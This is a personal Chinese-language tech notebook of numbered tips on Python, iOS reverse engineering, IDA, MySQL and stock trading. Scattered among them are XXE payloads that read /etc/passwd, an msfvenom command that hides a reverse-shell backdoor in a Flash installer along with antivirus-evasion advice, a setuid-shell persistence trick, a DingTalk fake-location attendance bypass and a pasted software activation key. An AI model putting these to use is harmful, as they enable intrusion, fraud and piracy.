   https://cnbin.github.io/blog/2015/05/21/iosyue-yu-kai-fa-theos-jie-shao/ 
   http://www.swiftyper.com/2016/01/25/ios-tweak-install-guide/

281.绕过钉钉打卡检测虚拟定位插件实现任意地址打卡
    https://bbs.feng.com/read-htm-tid-10874179.html
    google:钉钉打卡+ibackupbot

    逆向绕过钉钉打卡
    http://www.swiftyper.com/2017/02/15/dingtalk-fake-gps/
    [不越狱]http://www.dongcoder.com/detail-679997.html
            http://www.qiyouapp.com/kaoqinqiandao/dingding/14190.htm
            http://www.qiyouapp.com/kaoqinqiandao/dingding/14189.htm

282.python的requests模块无法访问https证书未通过验证的形如https://www.baidu.com的url的解决办法
    http://blog.csdn.net/xiaopangxia/article/details/49908889

283.查看未知python变量时可用:
    dir(param)或help(param)

284.python用selenium调PhantomJS浏览器爬虫
    http://www.jianshu.com/p/9d408e21dc3a
    https://zhuanlan.zhihu.com/p/26110017
    phantomjs api:
    https://thief.one/2017/03/13/Phantomjs-Api介绍/

285.windows下使用pip3安装模块报错
    Fatal error in launcher: Unable to create process using '"'
    原因:windows中安装了python3版本的python,但是我将c:\python36\python.exe改名成python3.exe了
    于是pip3找不到python.exe,因为pip3默认只能找到原来的c:\python36\python.exe,而现在这个文件被我改名了
    解决方法:在c:\python36\目录下不改python.exe的名字为python3,而是复制python.exe为python3.exe,两者保留
    这个pip3的bug在macOS下与linux下应该是不存在的,pip的开发太弱了.

286.newgame使用说明书
    http://oss.newgamepad.com/ng-files/MpH9juL11IG600-Q1%E8%AF%B4%E6%98%8E%E4%B9%A6%E6%9B%B4%E6%96%B03.pdf

287.html表单的提交方法
    http://blog.csdn.net/wang02011/article/details/6299517
    selenium提交表单
    https://stackoverflow.com/questions/32779563/how-can-i-click-submit-button

288.阅读64位反汇编代码可参考http://download.csdn.net/download/lpangbing/4237727

289.python捕获异常
    http://blog.csdn.net/u014717398/article/details/63252886
    python3中要将(except Exception,e:)改成(except Exception as e:)

290.firefox新版本中vimperator不好用解决方法
    安装51版本
    http://ftp.mozilla.org/pub/firefox/releases/51.0.1/mac/zh-CN/
    并安装最新版vimperator:https://addons.mozilla.org/en-US/firefox/addon/vimperator/
    windows安装vimperator如果用了一段时间发现各种问题出现则可通过重新安装vimperator来解决

291.代码阅读工具
    understand[https://www.macpeers.com/]
    sourceinsight[https://www.sourceinsight.com/]
    pycallgraph[https://github.com/gak/pycallgraph]
    gtalkabout[http://www.gtalkabout.cn/download.html]
    more[https://www.zhihu.com/question/23413774]

292.为网页位置指定标志符有两种方法
    a.使用锚点如<a name="print"></a>(name属性只能针对a标签来定位)
    b.使用id属性如<div id="print">
    这样在url中访问如1.php#print就可跳到print标志处

293.php的isset函数检测变量有没有存在,在url中如index.php?a=1&b=&c=2中的b变量是存在的,对服务器来说相当于
$_POST[b]="",是个空字符串,isset返回true

294.linux下普通用户保留root权限方法chmod u+s /bin/zsh

295.请求一个url时对应的网页中有form action="valuePart":
    a.如果valuePart以/开头,则要提交到的目的地址是不带路径的url+valuePart
    b.如果valuePart以http开头,则要提交到的目的地址是valuePart
    d.如果re.match(r"#+",valuePart)或re.match(r"\s*",valuePart)则要提交到的目的地址是url
    c.如果valuePart不是abc中的情况,则要提交到的目的地址是exp10it.py模块中的get_value_from_url(url)['y2']+'/'+valuePart

    后发现有python库[urllib.parse.urljoin]
    https://codeday.me/bug/20170825/60664.html

296.python变量命名规范
    http://www.cnblogs.com/Maker-Liu/p/5528213.html

297.tomcat部署web应用
    http://blog.csdn.net/stormwy/article/details/9355765

298.docker安装报错解决方法
    https://github.com/docker/for-mac/issues/8
    sudo mkdir -p /private/var/tmp
    sudo ln -sf /private/var/tmp /var/tmp

299.urldecode的问题理解
    https://www.zhihu.com/question/55141892

230.fish安装
    https://www.meanevo.com/2015/07/31/fish-on-macos/
    http://fish.sh/docs/current/index.html(配置文件设置)

231.macOS修改uidt gid
    sudo dscl . read /Users/username UniqueID
    sudo dscl . read /Users/username PrimaryGroupID
    sudo dscl . change /Users/username UniqueID oldvalue newvalue
    sudo dscl . change /Users/username PrimaryGroupID oldvalue newvalue

232.hamachi,天联替代产品
    zerotier[https://www.zerotier.com]
    showmypc[https://www.showmypc.com/]

233.shadowsocks
    http://www.auooo.com/2015/06/26/shadowsocks%EF%BC%88%E5%BD%B1%E6%A2%AD%EF%BC%89%E4%B8%8D%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/

234.xxe payload
    <?xml version="1.0"?> 
    <!DOCTYPE Header [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]> 
    <searchForm><from>&xxe;</from></searchForm>

235.web service理解解 
    http://www.ruanyifeng.com/blog/2009/08/what_is_web_service.html
    http://blog.csdn.net/zhuizhuziwo/article/details/8153327
    https://blog.netspi.com/hacking-web-services-with-burp/

236.webgoat系统操练
    http://www.freebuf.com/column/149807.html

237.查找30min内修改过的文件
    find / -name "*.py" -mmin -30
    24小时内修改:
    find / -name "*.py" -mmin 0
    http://www.cnblogs.com/hechunhua/p/4860544.html

238.linux超级服务器inetd
    说明:http://blog.chinaunix.net/uid-30145516-id-4846134.html
    利用inetd开后门:http://blog.csdn.net/d_0xff/article/details/51521075

239.cgi理解
    https://www.awaimai.com/371.html

240.ida远程调试ios程序
    a.debugserver
        http://blog.csdn.net/u013538542/article/details/72853521
        http://bbs.iosre.com/t/debugserver-lldb-gdb/65
    b.ios安装gcc,ldid,make
        http://kimi.it/517.html
    c.调试
        1)http://blog.csdn.net/proteas/article/details/78083512
        2)https://www.hex-rays.com/products/ida/support/tutorials/ios_debugger_tutorial.pdf
        中文在这里:https://bbs.pediy.com/thread-223172-1.htm
        3)usb调试
            https://www.jianshu.com/p/62f37ed63e6f
            http://blog.csdn.net/u011661836/article/details/61921308
    d.macOS编译ios程序
        http://zhoulingyu.com/2016/07/11/iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%B8%80%EF%BC%89ssh%E7%99%BB%E9%99%86%E4%B8%8E%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/
    e.可用vmmap(用于ida中调整加载基址)
        https://github.com/comex/myvmmap/blob/master/myvmmap.c

241.ios越狱应用开发
    http://www.jianshu.com/p/bc63492e4847
    http://www.swiftyper.com/2016/01/25/ios-tweak-install-guide/

    lldb与gdb命令对照:
        http://lldb.llvm.org/lldb-gdb.html

    ios脱appstre的壳:Clutch与dumpdecrypted的使用 
        http://sunhongyi.com/2017/01/05/iOSReverse-decrytion-tools/

    make出错时尝试这样:
        http://bbs.iosre.com/t/theos/2049

    实例开发:
        https://github.com/jackrex/FakeWeChatLoc
        http://mp.weixin.qq.com/s?__biz=MzA3NTYzODYzMg==&amp;mid=2653577384&amp;idx=1&amp;sn=b44a9c9651bf09c5bea7e0337031c53c&amp;scene=0#wechat_redirect
        logify.pl方法加日志
        http://www.qingpingshan.com/m/view.php?aid=156771
    
    免越狱tweak开发
        https://juejin.im/entry/58931dd5128fe10065441717
        http://www.chinapyg.com/thread-88593-1-1.html

    动态调试(在ida中要设置基址)
        http://www.cnblogs.com/ludashi/p/5730338.html

    hook原理
        hook理解:
            http://blog.l4ys.tw/2017/06/tmctf-2017-rev400/
            https://www.oschina.net/question/565065_68287

        hook种类
            https://bbs.kafan.cn/thread-471551-1-1.html
            http://www.epubit.com.cn/book/onlinechapter/33620
        inline hook原理
            http://www.cnblogs.com/zhangdongsheng/archive/2013/04/08/3007154.html
        百科
            http://www.baike.com/wiki/API+HOOK
        got hook
            http://ele7enxxh.com/Android-Arm-Inline-Hook.html

        http://gslab.qq.com/article-164-1.html
        http://www.jianshu.com/p/4f6d20076922

    frida学习资料
        frida官网
            https://www.frida.re/docs/home/
        frida官方文档部分翻译
            http://www.voidcn.com/article/p-cuytgsnz-w.html
        other
            https://www.anquanke.com/post/id/85758
            https://www.anquanke.com/post/id/85759
        brida
            http://www.freebuf.com/sectool/143360.html
            http://www.ninoishere.com/brida-advanced-mobile-application-penetration-testing-with-frida/
        hrida
            http://5alt.me/2017/11/我是如何用hrida自动生成签名的/


242.python手动释放变量
    del variable
    import gc
    gc.collect()

    ref:
    https://stackoverflow.com/questions/15455048/releasing-memory-in-python
    https://coderschool.cn/1723.html
    https://docs.python.org/3/library/gc.html

243.cydia下载官网
    http://apt.saurik.com/debs/
    cydia卸载方法:
        rm -r /Applications/Cydia.app
        rm -r /var/lib/cydia
        [reboot]
    cydia安装方法:
        wget http://apt.saurik.com/debs/cydia_1.1.30_iphoneos-arm.deb
        wget http://apt.saurik.com/debs/cydia-lproj_1.1.12_iphoneos-arm.deb
        dpkg -i cydia_1.1.30_iphoneos-arm.deb cydia-lproj_1.1.12_iphoneos-arm.deb
        apt-get update
        [reboot]
    cydia闪退修复方法:(不用重新安装cydia)
        rm -r /var/mobile/Library/Caches/com.saurik.Cydia/*

    cydia出现Encountered a section with no package: header的问题解决办法:
        看看cydia中每次apt-get update后的日志中有什么源有什么问题,如果有则删除这个源即可解决上面的问题

244.获取指定网站公钥命令
    openssl s_client -connect the.host.name:443 | openssl x509 -pubkey -noout
    从证书文件中获取公钥命令
    openssl x509 -in ~/Downloads/1.pem -pubkey

245.z3用法
    http://mp.weixin.qq.com/s/RLCGhXfBlL32gCDpleeQ9g
    https://github.com/Z3Prover/z3/wiki/Documentation
    https://yurichev.com/writings/SAT_SMT_draft-EN.pdf
    解题:
    http://solution-36.blogspot.com/2014/08/solving-picoctf-2013-harder-serial-with.html
    https://github.com/p4-team/ctf/tree/master/2017-09-02-tokyo/crypto_simple
    https://github.com/ctfs/write-ups-2015/tree/master/csaw-ctf-2015/reverse/ftp-300

246.python离线安装依赖包方法
    http://guoqiao.me/post/2015/1212-pip-install-offline-via-wheels

247.爬虫防ban
    https://scrapinghub.com/crawlera[收费]
    https://github.com/qiyeboy/IPProxyPool[免费]

248.后台执行命令
    http://blog.csdn.net/qq1124794084/article/details/50546507

249.python中的`__init__.py`文件的作用
    https://github.com/yidao620c/python3-cookbook/blob/master/source/c10/p01_make_hierarchical_package_of_modules.rst

250.编译python文件
    https://www.zhihu.com/question/30296617

251.python获取当前脚本的路径
    绝对路径:
        os.path.realpath(__file__)
    所在目录的绝对路径:
        os.path.split(os.path.realpath(__file__))[0]
        eg结果为:/root/1/dirname 

252.猜测ida pro使用menu|debugger|trace的跟踪功能可达到与binnavi类似功能

253.debain源理解
    http://www.cnblogs.com/beanmoon/p/3387652.html

254.macOS上安装proxifer要从官网下载,macpeers上的无法正常工作,不过macpeers上的序列号可用

255.cpu的保护模式
    https://www.zhihu.com/question/25272611

256.查看网站rank
    http://www.rankank.com/

257.linux权限
    目录
        读:   ls , dir ... 			表示可查看该目录下的文件列表
        写:   rm , mv, cp, mkdir ,touch ...	表示可在该目录下创建,删除,修改文件或者子目录,不过在这之前,一定要先有执行权限,不然进都进不去,又怎么写呢
        执行: cd  ...		
    文件
        读:	cat , tac , more , less ,head , tail ... 表示可查看该文件中的内容
        写:	vi , nano , echo ...			 只表示可对文件中的 内容 进行增删改,删除文件还要取决于当前用户对该文件所在目录是否有写权限
        执行:	可执行文件,shell脚本...			 在linux中任何文件都可以有执行权限,但只有可执行文件和脚本才能真正执行

    eg.如果一个文件有r属性,文件所在的文件夹也有r属性,但是文件所在文件夹没有x属性,那么这个文件是不能cat的,会提示权
    限不够,这种情况下,如果再给文件赋予x属性,这个文件也是不能执行的,会提示权限不够,应该是因为该文件所在的文件夹没
    有x属性导致这个文件不可读,不可读的情况下,就算赋予x属性也是无法执行的

258.设置上传目录不解析的方法,并不是chmod -x upload
    http://www.freebuf.com/articles/2465.html

259.httpd.conf(apache2.conf)和.htaccess的关系
    http://m.itboth.com/d/RBvuy2/apache-.htaccess-cgi-include
    .htaccess怎么用
        http://www.curafund.com/upload/download_file/1463483103.pdf

260.对有PIE保护的elf,ida加载时会以加载基址=0加载,angr会以加载基址=0x400000加载

261.64位kali编译32位elf需要
    apt-get install gcc-multilib
    apt-get install g++-multilib

262.添加burpsuite到dock栏
    https://www.mattandreko.com/2014/08/01/burp-icon-in-osx/

263.linux中gcc去保护编译
    https://stackoverflow.com/questions/2340259/how-to-turn-off-gcc-compiler-optimization-to-enable-buffer-overflow

264.openssl简单加密解密
    加密:openssl aes-256-cbc -in inputfile -out outputfile
    解密:openssl aes-256-cbc -d -in outputfile -out inputfile

265.mysql触发器用法
    https://www.cnblogs.com/zzwlovegfj/archive/2012/07/04/2576989.html
    利用触发器debug:
    https://stackoverflow.com/questions/10628640/get-full-mysql-query-string-on-insert-or-update
    same to:

    create table app_sql_debug_log(query mediumtext);
    DELIMITER |

    CREATE TRIGGER log_queries_insert BEFORE INSERT ON `your_table`
    FOR EACH ROW
    BEGIN
        DECLARE original_query VARCHAR(1024);
        SET original_query = (SELECT info FROM INFORMATION_SCHEMA.PROCESSLIST WHERE id = CONNECTION_ID());
        INSERT INTO `app_sql_debug_log`(`query`) VALUES (original_query);
    END;
    |
    DELIMITER ;

266.mysql开启general log
    http://lj6684.iteye.com/blog/1520681

267.python中for else,while else的用法
    https://blog.oldj.net/2010/06/20/python-loop-else/

268.pycharm调试scrapy
    https://stackoverflow.com/questions/21788939/how-to-use-pycharm-to-debug-scrapy-projects
    https://my.oschina.net/u/2968127/blog/894285
    http://blog.csdn.net/shijichao2/article/details/61940931
    http://www.scrapingauthority.com/2016/11/05/scrapy-debug/
    http://www.jianshu.com/p/eda047ac5c89

269.paralles desktop中切换应用程序快捷键为alt+tab
    当macOS中安装了command-tab plus时,使用option(alt)+tab为切换键后会与pd中的alt+tab冲突,使得在od的虚拟机中按
    alt+tab不能切换应用程序,解决办法是在pd中设置:总是发送macOS系统快捷方式.这样得到的效果是:
    a)在macOS中按alt+tab和command+tab可正常工作,其中command-tab puls的alt+tab功能更强大
    b)在pd的虚拟机中使用alt+tab可正常工作

    另外一种方法:
    pd中设置从不发送macOS系统快捷方式,并在kali linux中设置应用程序间切换快捷键为ctrl+t

270.markdown加图片语法:
    ![示例图片](http://upload-....jpg)

271.vim写markdown
    https://www.lequochung.me/2016/11/11/better-markdown-writing-experience-on-vim.html
    vim中wrap on:
    http://vim.wikia.com/wiki/Move_cursor_by_display_lines_when_wrapping
    https://vi.stackexchange.com/questions/88/how-do-i-deal-with-very-long-lines-in-text-500-characters

272.iphone等设备media query
    http://stephen.io/mediaqueries/
    https://gist.github.com/needim/d15fdc2ac133d8078f7c

273.iphone中的safari调试
    a)在macOS上的safari中打开偏好设置,打开高级选项,打开在菜单栏中显示开发功能
    b)在ios上打开设置|safari|高级|web检查器
    c)手机usb连接上mac,点mac上的safari的菜单栏上的开发,里面有手机子选项

274.自动炒股
    https://pc.qq.com/detail/8/detail_360548.html

275.ios一键新机搜索cydia插件361一键新机
    http://cydia.saurik.com/package/cn.tinyapps.rst/

276.order by类型sql注入
    order by后面可以加字段名,表达式和字段的位置,字段的位置需要是整数型.order by 后面不可以跟union
    order by注入跟where条件注入具有同样的布尔盲注和时间注入的方式
    http://vinc.top/2016/06/20/mysql-order-by-后注入/
    https://www.secpulse.com/archives/57197.html
    http://www.freebuf.com/articles/web/155876.html

277.python rpc模块pyro4
    http://blog.csdn.net/xiaolewennofollow/article/details/52155457

278.flask捕获异常url请求
    http://flask.pocoo.org/snippets/57/

279.一个好用的python简易web server
    https://gist.github.com/bradmontgomery/2219997

280.mysql查看一个表的列名
    show columns from dbname.tablename;
    或者
    desc table_name;
    或者
    select column_name from information_schema.columns where table_name='%s' and column_name regexp '.*scaned' and column_name not regexp '(pang)|(sub).*' 

281.arm指令速查
    http://blog.csdn.net/u010071291/article/details/50685757
    比较指令
        http://blog.csdn.net/marc07/article/details/62885832
        http://blog.csdn.net/qq1084283172/article/details/47296931

282.支持arm处理器的assemble patch的ida插件,keypatch
    http://blog.csdn.net/fjh658/article/details/52268907
        brew install cmake
        pip install keystone-engine
        git clone https://github.com/keystone-engine/keypatch.git
        cp -r /usr/local/lib/python2.7/site-packages/keystone /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/python/
        cp keypatch/keypatch.py /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/plugins/
    似乎将立即数写入内存地址中无法一步完成,需要先mov register,#0x立即数,再STR register,[Rn{,#offset}]

283.破解ios app时
    越狱设备可直接安装破解后的app
        只有在越狱之后,iOS 才能运行没有签名的代码
    未越狱设置需要这样才能安装
        使用cydia impact
            https://bbs.feng.com/read-htm-tid-11039652.html
                需要关闭手机的二次验证,否则会出错,不关闭的解决办法在这里
                    https://sspai.com/post/38758
        或者用iOS APP Signer
            https://www.wxz.name/2017/05/28/ios-resign/
            http://www.hangge.com/blog/cache/detail_1219.html
        或者命令行这样操作
            http://www.freebuf.com/articles/terminal/127200.html
            http://www.swiftyper.com/2016/12/26/wechat-redenvelop-tweak-for-non-jailbroken-iphone/
            https://yq.aliyun.com/articles/54417
            https://www.jianshu.com/p/5f51685c98aa
        或者使用testflight
            https://www.jianshu.com/p/27545c2d4d8b
            https://sspai.com/post/27311
        或者使用第三方的收费版(蒲公英)的企业签名
            https://www.pgyer.com/app/signature

    或许会用到ldid签名
        http://www.it610.com/article/2187732.htm
        ldid签名如果出错则chmod +aw appname再签名
            http://blog.csdn.net/u011156012/article/details/40655597#reply
                
    破解deb时,需要解包和重新打包
        http://blog.csdn.net/yygydjkthh/article/details/36695243

    ios签名机制
    https://www.zhihu.com/question/20490711
    https://objccn.io/issue-17-2/
    https://cloud.tencent.com/developer/article/1013244
    http://www.uml.org.cn/mobiledev/201703205.asp
    http://kittenyang.com/pokemongocrack/
    https://bbs.pediy.com/thread-218961.htm
    https://mrmad.com.tw/cydia-impactor
    http://www.enkichen.com/2016/01/15/ios-certification-and-code-sign-note/

284.cycript设置查看ui对应函数时用到的?expand命令失效时可以这样弥补[[UIApp keyWindow] recursiveDescription].toString(),cycript查找ui对应的元素可通过找几个主要的大树枝,如果大树枝[#0x... setHidden:YES]后发现要找的UI不显示了则说明要找的UI在这个大树枝里面,然后再大树枝里通过[#0x... setHidden:YES]逐渐找到最终的小树枝.通过cycript找UI这条路一般不用,除非用flex_injected找不到(有些app无法使用flex_injected) https://www.jianshu.com/p/e802b8b76e92

285.macOS上的ida需要root权限才允许本地调试,可在shell的配置中加上/Applications/IDA Pro 7.0/ida64.app/Contents/MacOS/ida64的alias,alias ida64="/Applications/IDA Pro 7.0/ida64.app/Contents/MacOS/ida64",alias ida="/Applications/IDA Pro 7.0/ida64.app/Contents/MacOS/ida".

286.tls反调试理解
    http://blog.csdn.net/bugmeout/article/details/45605497
    http://www.rohitab.com/discuss/topic/40811-detect-debugger-with-tls-callback/

287.idapython api
    https://www.hex-rays.com/products/ida/support/idapython_docs/
    https://github.com/idapython/src/blob/d99a89369741ce272ba792d6f087d0739a2f8ac7/api_contents.txt

288.炒股基础知识
    https://www.zhihu.com/question/37054230
    支撑线和阻力线操作图解 
    http://www.maofou.com/jsfx/zhichengxian-zulixian.html

289.最新kali3由于是php7环境,无法直接使用sqli-labs,其中的mysql_connect被php7废弃,可用docker
    https://github.com/tuxotron/Audi_SQLi_lamp_container/tree/master/Audi_SQLi_lamp_container

290.python写二进制到文件
    str([hex(ord(c)) for c in '<?php phpinfo();?>'])
    Out[19]: "['0x3c', '0x3f', '0x70', '0x68', '0x70', '0x20', '0x70', '0x68', '0x70', '0x69', '0x6e', '0x66', '0x6f', '0x28', '0x29', '0x3b', '0x3f', '0x3e']"
    with open('/tmp/1.png','a+') as f:
        f.write('\x6e\x66\x6f...')

291.kindle用法
    https://www.jianshu.com/p/843d50040fe9
    https://xiaozhou.net/register_and_activate_your_kindle-2012-01-12.html
    macOS上打开kindle的工具
        https://www.amazon.co.uk/kindle-dbs/fd/kcp

292.ubuntu安装lxml
    http://blog.csdn.net/lincifer/article/details/51296559

293.nordvpn
    如果连不上则需要关闭nordvpn中的cybersec选项,如果还是连不上,则试试用openvpn的客户端,链接如下:
    https://nordme.org/tutorials/x-mac-os-x/openvpn/

294.workflow_list
    alfred powerpack 
    有道翻译加强版workflow
    https://zhuanlan.zhihu.com/p/20810311
    http://alfredworkflow.com/
    http://www.packal.org/

295.macOS下不同应用设置默认输入法工具
    GhostSKB

296.HxD是一个认真设计的快捷16进制编辑器.还提供直接磁盘编辑、内存修改和处理任何大小的文件.

297.django在设置密码时有时回车无效,这时应该是系统的python进程|线程过多导致的混乱,重启终端或重启系统可解决

298.猜测:
    select column_name from information_schema.columns where table_name='targets' and column_name regexp '.*scaned' and column_name not regexp '(pang)|(sub).*' order by table_name"
    这种从information_scchema表中查内容的sql语句执行得到的结果不一定任何时候都准确,如上面这句sql中,如果曾经的column_name有BruteCrack_scaned列,而后来删除了这个列,但是由于mysql的文件缓存存在,导致现在执行上面的语句会得到包含BruteCrack_scaned列的结果,重启系统后仍然有,猜测要删除对应的mysql的文件缓存才可得到正确的没有BruteCrack_scaned列的结果.

299.炒股
    kdj线金叉时kd值在20以下买,死叉时kd值在80以上卖
    https://www.cnblogs.com/doseoer/p/5578873.html
    http://www.cnblogs.com/doseoer/p/7898989.html
    http://blog.sina.com.cn/s/blog_14c1e9a8d0102wsmz.html
    http://www.360doc.com/content/16/1019/22/32167373_599728470.shtml
    http://dy.163.com/v2/article/detail/C15MEDUE0519A87H.html
    http://www.sohu.com/a/208777212_354375
    http://blog.sina.com.cn/s/blog_6520bccf0102xcvt.html

    入门视频
    https://www.pearvideo.com/album_100116

    futuquant
        api文档
            https://futunnopen.github.io/futuquant/intro/intro.html
        kdj获取
            https://www.joinquant.com/community/post/detailMobile?postId=1903&page=&limit=20&replyId=&tag=
            https://www.joinquant.com/post/867
            https://www.joinquant.com/post/142
            https://www.ricequant.com/community/topic/663/tablib-stoch的算法和通达信kd指标有不同/5
            https://blog.csdn.net/choclover/article/details/6290840

       kdj策略
           http://halazi999.com/4904.html
           http://halazi999.com/4925.html

       其他策略
           http://halazi999.com/category/jishujiaoliu

    量化交易
        https://legacy.gitbook.com/book/wizardforcel/python-quant-uqer/details
        https://xueqiu.com/9139885141/65018999
        http://www.wenhua.com.cn/guide/sm5-1.htm

    策略:
        http://www.cnblogs.com/fangbei/p/wequant-strategy-kdj.html
300.python3安装talib
    https://github.com/mrjbq7/ta-lib/issues/137

301.python日志模块logging
    https://blog.csdn.net/z_johnny/article/details/50740528

302.windows下的caps lock->esc && ctrl
    http://vim.wikia.com/wiki/Map_caps_lock_to_escape_in_Windows

303.nordvpn tips:use tcp

304.imac更换固态硬盘
    https://zh.ifixit.com/Guide/iMac+%E5%9B%A0%E7%89%B9%E5%B0%94+27-Inch+Retina+5K+%E6%98%BE%E7%A4%BA%E5%B1%8F+%E7%A1%AC%E7%9B%98%E6%9B%B4%E6%8D%A2/30522
    https://zh.ifixit.com/Guide/27%E8%8B%B1%E5%AF%B8+5K+Retina+%E6%98%BE%E7%A4%BA%E5%B1%8F+iMac+%E5%9B%BA%E6%80%81%E7%A1%AC%E7%9B%98SSD+%E6%9B%B4%E6%8D%A2/30537

305.linux环境下打开gbk编码文本:
    vim example.txt -c "e ++enc=cp936"
    可解决vim打开后中文乱码的问题

306.kali无法安装头文件的问题解决办法
    https://unix.stackexchange.com/questions/328655/cant-install-linux-headers-kali-linux

307.在linux终端中如果发现有字符编码的问题,可:echo $LANG看看是不是不是utf8编码,如果不是则在终端中执行:export LANG=zh_CN.UTF-8

308.rz命令上传失败时要添加-be参数,因为默认用ascii码上传,-be表示用二进制上传且转义特殊字符 rz -be

309.后门绑定正常程序
    a)msf生成绑定正常exe的后门msfvenom -p windows/meterpreter/reverse_tcp_rc4 -e x86/shikata_ga_nai -f exe LHOST=192.168.110.131 LPORT=26666 RC4PASSWORD=helloworld -x /root/Desktop/flashplayer29_ga_install.exe -o /root/Desktop/bind.exe
    b)或者使用shelter绑定正常程序如果上面生成的不免杀,则再用winlicense加壳
    c)exe捆绑无毒工具http://www.webtoolmaster.com/download.htm

310.利弗莫尔
    https://wenku.baidu.com/view/477f4ed9f111f18582d05ab1.html
    https://wenku.baidu.com/view/a68c13e9561252d380eb6eed.html
    http://bbs.tianya.cn/post-stocks-1271091-1.shtml

311.firefox老版本禁止自动更新
    1.设置里面设置不检查更新
    2.about:config将相关更新url改成一个不存在的地址
    上面2者都要进行

312.查股票发行价格
    http://data.eastmoney.com/xg/xg/detail/300750.html

313.微信机器人
    https://github.com/littlecodersh/itchat
    https://www.jianshu.com/p/7aeadca0c9bd
    https://cloud.tencent.com/info/fdacb0381ac296716da90959b6aa30db.html

314.头痛治疗
    多喝水(加姜),吃个苹果(带皮吃),热水澡,轻按压头痛部位,穿袜子,不要躺在床上看手机或眼睛睁开
    https://zh.wikihow.com/治疗头痛(不用药物)

315.快速将文件夹权限设置成everyone
   icacls * /t  /grant Everyone:F

316.chrome调试js:
    https://www.jb51.net/article/58570.htm

317.禁止kali系统启动时/etc/resolve.conf被修改导致无法上网
    https://askubuntu.com/questions/623940/network-manager-how-to-stop-nm-updating-etc-resolv-conf

318.kali安装docker
    https://www.ptrace-security.com/2017/06/14/hackontuesday-episode-7-how-to-install-docker-on-kali-linux-2017-1/

319.keyboard和alfred提升效率
    https://www.jianshu.com/p/105c7c017f23
    http://www.cnblogs.com/ficow/p/5574882.html

320.word里面插入高亮代码
    http://www.planetb.ca/syntax-highlight-word

321.xxe漏洞的测试 
    https://b1ngz.github.io/XXE-learning-note/
    http://sh1yan.top/?p=119
    payload:
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE copyright [
    <!ENTITY attack SYSTEM "file:///etc/passwd">
    ]>
    <reset>
    <login>&attack;</login>
    <secret>xxx</secret>
    </reset>

322.webgoat坑
    安装完成后要访问的是http://ip:port/WebGoat,要不然是404

323.contrast工作原理
    https://de.spectrami.com/contrast-sec
    https://www.prnewswire.com/news-releases/first-of-its-kind-cyber-security-product-unifies-vulnerability-detection--attack-protection-300282492.html
    https://pivotal.io/platform/services-marketplace/identity-and-security/contrast-security

    注册:
    https://www.contrastsecurity.com/community-edition-lp-website?hsCtaTracking=cefad257-dd24-43eb-b6e9-2dab469c810a%7C21a3b9ad-ab29-402d-8c91-23e97ce25726
    登录:
    https://ce.contrastsecurity.com/Contrast/static/ng/index.html#/pages/signin?unauthenticated=true

324.websocket原理(如果将websocket通信做成木马呢?)
    https://www.zhihu.com/question/20215561
    https://www.cnblogs.com/jinjiangongzuoshi/p/5062092.html

325.python数据库查询结果转成字典
    https://blog.csdn.net/zhaihaifei/article/details/53898260

326.清除dns缓存
    https://www.hostinger.com/tutorials/how-to-flush-dns#gref

327.itchat
    https://juejin.im/post/5b61b01f6fb9a04fba6e97ba

328.kindle笔记导出
    https://www.clippings.io/

329.stl学习
    http://www.cnblogs.com/zhili/p/STLIntroduce.html
    https://www.cnblogs.com/BeyondAnyTime/archive/2012/08/08/2627666.html

330.QT开发
    https://blog.csdn.net/zgrjkflmkyc/article/details/8644226
    https://www.bilibili.com/video/av9402477?from=search&seid=9150492468556083696
    https://www.bilibili.com/video/av10357292?from=search&seid=9150492468556083696

331.c++命名规范
    https://blog.csdn.net/u014294166/article/details/52772133

332.chrome好用的网页视频嗅探插件:Video DownloadHelper,使用vpn(hk)连接+合作应用下载方式来下载可绕过2小时才可下载的限制 

333.迅雷资源下载不了或出错或版权限制的解决办法
    使用迅雷5.8下载:http://tcy.mqego.com/xunkeifhb5xz.zip

334.win7安装visual studio 2015
    http://www.cnblogs.com/sthinker/p/5905611.html
    企业版:http://download.microsoft.com/download/B/8/F/B8F1470D-2396-4E7A-83F5-AC09154EB925/vs2015.ent_chs.iso
    百度云盘:http://pan.baidu.com/s/1qWl4L1i
    激活密钥:HM6NR-QXX7C-DFW2Y-8B82K-WTYJV

335.真实换手换手率算法
    真实换手率=软件显示换手率*1/(1-流通大股东占比)
    http://blog.sina.com.cn/s/blog_74d237650102xlaa.html

336.1password用法
    https://sspai.com/post/35195#html-top

337.burpsuite
    burpsuite中用于无回显类型漏洞手动测试的用法(collaborator-client)
    https://support.portswigger.net/customer/portal/articles/2945928-using-burp-collaborator-client

338.参数化查询的作用范围
    LIMIT,TOP,TABLESAMPLE,HAVING,GROUP BY,ORDER BY,OUTPUT...INTO或FOR XML从句不会被参数化.
    https://www.bbsmax.com/A/LPdowWEd3a/

339.python列表条件生成
    [i for i in range(k) if condition]:此时if起条件判断作用,满足条件的,将被返回成为最终生成的列表的一员.
    [i if condition else exp for exp]:此时if...else被用来赋值,满足条件的i以及else被用来生成最终的列表.

340.nginx导致的ssrf等漏洞
    https://bbs.ichunqiu.com/thread-41928-1-1.html

341.html支持pdf功能
    https://github.com/mozilla/pdf.js/wiki/Setup-pdf.js-in-a-website
    pdf的url支持其他域方法
    https://github.com/mozilla/pdf.js/issues/7153
    https://blog.csdn.net/xinlingdexueba/article/details/79555678

342.teamviewer
    TeamViewer14链接: 链接:https://pan.baidu.com/s/102w9msTkvG2RbACc9SoFMA 
    提取码:n1rn 
    TeamViewer13+12安装版链接:https://pan.baidu.com/s/1Uk6bc8Zdhlh1-BiW16uEaw 
    提取码:vk60

343.chrome审查元素中的copy selector和copy xpath结合jquery定位元素的方法
    a)copy selector得到的结果通过$(result)来定位元素
    b)copy xpath得到的结果通过$x(result)来定位元素

344.redhat7配centos的yum源
    https://zhuanlan.zhihu.com/p/26125618
    https://hk.saowen.com/a/741c4c948898db574fb8aa22f74dae5829d52bbb1c870828f9d72d9f5c77bfb8
    注意:要保证/etc/yum.repos.d目录下只有一个配置文件
    test

```
